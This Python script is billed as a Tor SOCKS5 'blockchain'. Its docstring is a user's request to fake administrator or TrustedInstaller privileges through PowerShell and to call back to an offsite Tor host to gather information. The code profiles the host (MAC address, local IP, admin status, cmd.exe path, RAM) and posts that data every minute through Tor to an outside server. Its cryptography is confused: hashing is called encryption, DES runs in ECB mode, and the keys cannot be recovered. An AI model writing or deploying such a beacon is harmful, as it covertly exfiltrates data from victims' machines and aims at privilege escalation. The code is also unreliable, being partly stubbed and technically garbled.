#!/usr/bin/env python3
"""
Blockchain System with Tor SOCKS5 Integration

Hello. My name is Dante. 
I would like to know about programming a 
blockchain from start that reiterates itself 
on a tor sock5 network. 

First I would have a DES encrypt a date 
everytime a period is stacked, 
while it encrypts the MAC Address to
The machine to SHA-512 level encryption, 
than AES encrypt the two 
values as (DES + MAC(SHA) + AES) + AES . 
Than label the stack with a plaintext key 
as a combination to decrypt the 3 values 
than encrypts it with a DES encryption. 

Convert all values to a HEX chain 
with the (HEX) :__plaintext__:(SHA).

That would be the beginning of the 
Blockchains algorithm. We have to encrypt 
the IP_Address and Boolean checks for MAC Changers
 is available or in use, check MAC Changers 
 and update output with change in MAC Address.

Objective [ 
Generate variables to the value of a HEX Chain
 with further encryptions of basic input of system
   variables such as resolution,
     GPU use,  RAM use, Motherboard use, 
     full background of system specs. ]

This Objective will be used as a 
common ground for a block to be part a 
traveling proxy network of ip_Address 
connecting to a offsite sock5 TOR network.. 

There will be a Client Side to a 
server being a CMD.EXE file from looking for 
source system spec "check location of cmd.exe" 
yet, we would like to 
check if the user administrator if 
not find powershell scripts to 
fake operating under administrator or 
better yet TrustedInstaller network user. 

The sock5 ip will be encrypted to a Binary Value
 that will in turn be converted to a SHA-256 
 that will further exploit the newly 
 generated block to seek second block 
 the client will callback a offsite sock5
   tor network ping and later gather information.
     Even saving packets into a
       readable command prompt input based on 
      sock5 and ipv6.
"""


import hashlib
import datetime
import os
import base64
import socket
import subprocess
import platform
import uuid
import ctypes
import winreg
import json
import struct
import socks
import requests
from Crypto.Cipher import AES, DES
from Crypto.Hash import SHA256, SHA512
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import threading
import time

class BlockChainGenerator:
    def __init__(self, tor_host="127.0.0.1", tor_port=9050):
        self.blockchain = []
        self.tor_host = tor_host
        self.tor_port = tor_port
        self.last_known_mac = None
        self.mac_changed = False
        self.key = self._generate_key()
        self.network_lock = threading.Lock()
        self.running = False
        
    def _generate_key(self):
        """Generate encryption key from system-specific variables"""
        mac = self._get_mac_address()
        timestamp = str(datetime.datetime.now())
        key_data = f"{mac}{timestamp}".encode()
        return SHA256.new(key_data).digest()
    
    def _encrypt_aes(self, data):
        """Encrypt data using AES"""
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded_data = pad(data.encode(), AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        return base64.b64encode(iv + ciphertext).decode()
    
    def _decrypt_aes(self, encrypted_data):
        """Decrypt data using AES"""
        data = base64.b64decode(encrypted_data)
        iv = data[:16]
        ciphertext = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_data.decode()
    
    def _encrypt_des(self, data):
        """Encrypt data using DES"""
        # In practice, implement proper DES encryption
        des_key = self.key[:8]
        cipher = DES.new(des_key, DES.MODE_ECB)
        padded_data = pad(data.encode(), DES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        return base64.b64encode(ciphertext).decode()
    
    def _encrypt_sha512(self, data):
        """Encrypt data using SHA-512"""
        return SHA512.new(data.encode()).hexdigest()
    
    def _generate_hex_chain(self, plaintext, key=None):
        """Convert plaintext to hex chain with key"""
        if key is None:
            key = self._encrypt_sha512(str(datetime.datetime.now()))
        return f"HEX:{key}:{plaintext}"
    
    def _get_mac_address(self):
        """Get system MAC address"""
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0,2*6,2)][::-1])
        return mac
    
    def _check_mac_changer(self):
        """Check for MAC changer software"""
        known_mac_changers = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for reg_path in known_mac_changers:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        if any(mac_changer in display_name.lower() for mac_changer in ["mac", "changer", "spoof"]):
                            return True
                    except:
                        continue
            except:
                continue
        return False
    
    def _update_mac_if_changed(self):
        """Update MAC address if changed"""
        current_mac = self._get_mac_address()
        if current_mac != self.last_known_mac:
            self.mac_changed = True
            self.last_known_mac = current_mac
            return True
        return False
    
    def _check_admin_privileges(self):
        """Check if running with admin privileges"""
        try:
            # Try to open a protected registry key
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001")
            return True
        except:
            # Try to create a test file in Program Files
            try:
                with open(r"C:\Program Files\test_write.txt", "w") as f:
                    f.write("test")
                os.remove(r"C:\Program Files\test_write.txt")
                return True
            except:
                return False
    
    def _find_cmd_exe(self):
        """Find location of cmd.exe"""
        cmd_locations = [
            r"C:\Windows\System32\cmd.exe",
            r"C:\Windows\SysWOW64\cmd.exe",
            r"C:\Windows\sysnative\cmd.exe"
        ]
        for path in cmd_locations:
            if os.path.exists(path):
                return path
        return None
    
    def _get_system_specs(self):
        """Collect system specifications"""
        return {
            'resolution': self._get_resolution(),
            'gpu_usage': self._get_gpu_usage(),
            'ram_usage': self._get_ram_usage(),
            'motherboard': self._get_motherboard_info(),
            'cmd_location': self._find_cmd_exe(),
            'admin_privileges': self._check_admin_privileges()
        }
    
    def _get_resolution(self):
        """Get screen resolution"""
        try:
            from tkinter import Tk
            root = Tk()
            width = root.winfo_screenwidth()
            height = root.winfo_screenheight()
            root.destroy()
            return f"{width}x{height}"
        except:
            return "Unknown"
    
    def _get_gpu_usage(self):
        """Get GPU usage (simplified)"""
        try:
            # This would interface with GPU monitoring APIs in practice
            return "Unknown"
        except:
            return "Unknown"
    
    def _get_ram_usage(self):
        """Get RAM usage"""
        try:
            import psutil
            ram = psutil.virtual_memory()
            return f"{ram.used}/{ram.total} ({ram.percent}%)"
        except:
            return "Unknown"
    
    def _get_motherboard_info(self):
        """Get motherboard information"""
        try:
            # This would query system information in practice
            return "Motherboard Info"
        except:
            return "Unknown"
    
    def _generate_block(self):
        """Generate a new blockchain block"""
        # Collect system information
        system_info = self._get_system_specs()
        
        # Encrypt system info with layered encryption
        encrypted_data = {}
        for key, value in system_info.items():
            if key == 'resolution' or key == 'gpu_usage':
                # Use AES for most data
                encrypted_data[key] = self._encrypt_aes(str(value))
            elif key == 'cmd_location':
                # Use DES for sensitive paths
                encrypted_data[key] = self._encrypt_des(str(value))
            else:
                # Use SHA-512 for critical values
                encrypted_data[key] = self._encrypt_sha512(str(value))
        
        # Create block with encrypted data
        block = {
            'timestamp': datetime.datetime.now().isoformat(),
            'data': encrypted_data,
            'previous_hash': self._get_last_hash() if self.blockchain else None,
            'hash': self._calculate_hash(encrypted_data),
            'mac_address': self._encrypt_sha512(self._get_mac_address()),
            'ip_address': self._get_local_ip()
        }
        
        self.blockchain.append(block)
        return block
    
    def _get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_last_hash(self):
        """Get hash of last block"""
        if not self.blockchain:
            return None
        return self.blockchain[-1]['hash']
    
    def _calculate_hash(self, data):
        """Calculate block hash"""
        data_str = json.dumps(data, sort_keys=True)
        return SHA256.new(data_str.encode()).hexdigest()
    
    def connect_to_tor(self):
        """Connect to Tor network via SOCKS5"""
        try:
            # Set up SOCKS5 proxy
            socks.set_default_proxy(socks.SOCKS5, self.tor_host, self.tor_port)
            socket.socket = socks.socksocket
            
            # Verify connection works
            s = socket.socket()
            s.connect((self.tor_host, self.tor_port))
            s.close()
            return True
        except Exception as e:
            print(f"Failed to connect to Tor: {e}")
            return False
    
    def send_block_to_network(self, block):
        """Send block to offsite Tor network"""
        try:
            # Connect to Tor
            if not self.connect_to_tor():
                return False
                
            # Prepare data for transmission
            data = json.dumps(block)
            encrypted_data = self._encrypt_aes(data)
            
            # Send to offsite Tor network
            response = requests.post(
                "http://offsite-tor-network.com/submit-block",
                data={"block": encrypted_data},
                timeout=30
            )
            
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            print(f"Error sending block: {e}")
            return False
    
    def run(self):
        """Run blockchain generation loop"""
        self.running = True
        print("[+] Starting blockchain generator...")
        
        while self.running:
            # Generate new block
            block = self._generate_block()
            
            # Send to Tor network
            success = self.send_block_to_network(block)
            
            if success:
                print(f"[+] Block sent successfully: {block['hash']}")
            else:
                print(f"[!] Failed to send block: {block['hash']}")
            
            # Check MAC changes
            self._update_mac_if_changed()
            
            # Sleep before next block
            time.sleep(60)  # 1 minute between blocks
    
    def stop(self):
        """Stop blockchain generation"""
        self.running = False
        print("[+] Stopped blockchain generator")

if __name__ == "__main__":
    # Initialize blockchain generator
    generator = BlockChainGenerator()
    
    try:
        # Start blockchain generation
        generator.run()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        generator.stop()